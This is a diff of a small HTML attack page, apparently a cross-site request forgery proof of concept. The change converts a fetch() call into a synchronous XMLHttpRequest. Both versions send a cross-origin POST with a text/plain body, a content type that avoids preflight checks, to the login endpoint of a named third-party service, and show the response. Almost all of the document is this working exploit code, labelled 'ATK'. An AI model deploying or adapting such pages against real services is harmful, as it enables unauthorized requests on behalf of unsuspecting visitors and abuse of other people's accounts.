@@ -1,20 +1,16 @@
 <!DOCTYPE html>
-<html><head><meta charset="utf-8"><title>ATK-L1</title></head>
+<html><head><meta charset="utf-8"><title>ATK-L2</title></head>
 <body><pre id="out">L-START</pre>
 <script>
-(async () => {
-  try {
-    const lr = await fetch("https://widget.swapped.com/api/v1/auth/login", {
-      method: "POST",
-      headers: { "Content-Type": "text/plain" },
-      body: JSON.stringify({ email: "clean1795767360@euploading.com", url: "https://widget.swapped.com/" })
-    });
-    const t = await lr.text();
-    document.getElementById("out").textContent = "L-RESULT " + lr.status + " :: " + t.slice(0, 200);
-    document.title = "ATK-L1-" + lr.status;
-  } catch (e) {
-    document.getElementById("out").textContent = "L-ERR " + e.message;
-    document.title = "ATK-L1-ERR";
-  }
-})();
+try {
+  var xhr = new XMLHttpRequest();
+  xhr.open("POST", "https://widget.swapped.com/api/v1/auth/login", false);
+  xhr.setRequestHeader("Content-Type", "text/plain");
+  xhr.send(JSON.stringify({ email: "clean1795767360@euploading.com", url: "https://widget.swapped.com/" }));
+  document.title = "ATK-L2-" + xhr.status;
+  document.getElementById("out").textContent = "L-RESULT " + xhr.status + " :: " + xhr.responseText.slice(0, 200);
+} catch (e) {
+  document.title = "ATK-L2-ERR";
+  document.getElementById("out").textContent = "L-ERR " + e.message;
+}
 </script></body></html>
